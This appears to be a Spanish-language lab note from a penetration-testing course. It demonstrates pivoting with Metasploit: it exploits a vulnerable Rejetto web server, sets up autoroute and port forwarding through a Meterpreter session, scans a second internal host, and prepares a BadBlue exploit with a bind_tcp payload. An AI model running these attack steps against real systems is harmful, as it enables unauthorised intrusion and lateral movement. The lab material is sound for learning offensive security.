
 Para ver el funcionamiento de pivoting se plantea un ejemplo:

Host víctima
1. 10.4.19.162
2. 10.4.16.92

![[Pasted image 20250306085619.png]]

Solo tenemos acceso a la primera IP. Vamos a realizar un scaneo a este host:

![[Pasted image 20250306085751.png]]

Si analizamos el servicio del puerto 80 veremos que es uno que ya hemos visto como es vulnerable.

![[Pasted image 20250306090209.png]]

Es la versión rejetto, vamos a buscar el módulo que le corresponde de metasploit

![[Pasted image 20250306090650.png]]

Cuando le demos a exploit conseguiremos una sesión de meterpreter, desde está sesión podemos hacer una enumeración del host y ver diferente información como los permisos que tenemos. Pero lo importante es comprobar la conexión a la otra ip.

Con el comando ``route`` podemos ver la tabla de conexiones:

![[Pasted image 20250306090924.png]]

Y si realizamos una prueba de ping podemos ver como hay conexion.

![[Pasted image 20250306091037.png]]

Vamos a cerrar la shell y volver al meterpreter con el comando ``exit``

 Este paso a realizar ahora es fundamental para conseguir la conexión al segundo host desde metasploit.

```bash
#Fijaos bien como pongo la subnet y con el ipconfig vemos la mascara.
run autoroute -s 10.4.19.0/20

#Dejamos la sesión en segundo plano
background

#Vamos a escanear los puertos del segundo host
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.4.16.92
set PORTS 1-100
exploit
```

![[Pasted image 20250306093752.png]]

Tenemos el puerto 80 abierto, pero para poder interactuar con el tendremos que vincular uno de nuestros puertos a un puerto del host 1.

```bash
sessions 1
#Vinculamos el puerto 1234 de nuestro host con el puerto 80 haciendo consulta a la ip del host 2
portfwd add -l 1234 -p 80 -r 10.4.16.92
portfwd list

#Si abrimos una nueva tab en le terminal podemos escanear el servicio
nmap -sV -sS -p 1234 localhost
```

![[Pasted image 20250306094141.png]]

```bash
#Como hemos visto es un BadBlue vulnerable. Vamos a volver a la consola de metasploit y a explotar el servicio.

use windows/http/basblue_passthru
#El puerto lo podemos dejar en 80 ya que metasploit esta usando autoruoute
set payload windows/meterpreter/bind_tcp
set RHOSTS 10.4.16.92
```

![[Pasted image 20250306094427.png]]

